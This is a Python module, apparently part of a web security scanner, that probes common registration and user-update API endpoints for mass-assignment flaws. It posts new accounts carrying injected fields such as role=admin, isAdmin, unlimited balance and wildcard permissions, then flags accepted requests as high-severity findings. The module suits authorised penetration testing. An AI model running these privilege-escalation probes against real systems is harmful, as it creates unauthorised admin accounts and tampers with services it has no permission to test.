"""mass_assignment — probe for privilege escalation via extra fields"""
from core.http import HttpClient
import json

EXTRA_FIELDS = [
    {"role":"admin"}, {"isAdmin":True}, {"admin":True}, {"is_admin":True},
    {"user_type":"admin"}, {"type":"admin"}, {"level":9999},
    {"permissions":["admin","*"]}, {"group":"administrators"},
    {"verified":True}, {"email_verified":True}, {"emailVerified":True},
    {"balance":999999}, {"credits":999999}, {"premium":True},
    {"active":True}, {"status":"active"}, {"approved":True},
    {"role":"superuser"}, {"roles":["admin","user"]},
]

REGISTER_PATHS = ["/api/register","/api/users","/api/v1/users","/register",
                  "/api/signup","/signup","/api/account","/api/profile","/api/user/update"]

class MassAssignment:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []

        for path in REGISTER_PATHS:
            url = base + path
            probe = http.get(url)
            if not probe or probe.status_code == 404: continue
            print(f"[mass_assignment] {path} exists ({probe.status_code})")

            for extra in EXTRA_FIELDS:
                payload = {
                    "username": f"omni_test_{abs(hash(str(extra)))%10000}",
                    "email": f"omni{abs(hash(str(extra)))%10000}@example.com",
                    "password": "OmniTest123!",
                    **extra,
                }
                r = http.post(url, json=payload, headers={"Content-Type":"application/json"})
                if not r: continue
                # success heuristic
                if r.status_code in (200, 201):
                    try:
                        resp = r.text.lower()
                        if any(k in resp for k in ("admin","role","escalat","elevat","success")):
                            findings.append({"path":path,"field":list(extra.keys())[0],"code":r.status_code})
                            print(f"  [!] accepted {list(extra.keys())[0]}")
                            logger.finding("mass_assignment","high",f"{path} accepts {list(extra.keys())[0]}")
                    except Exception: pass

        print(f"[mass_assignment] {len(findings)}")
        return {"findings": findings}
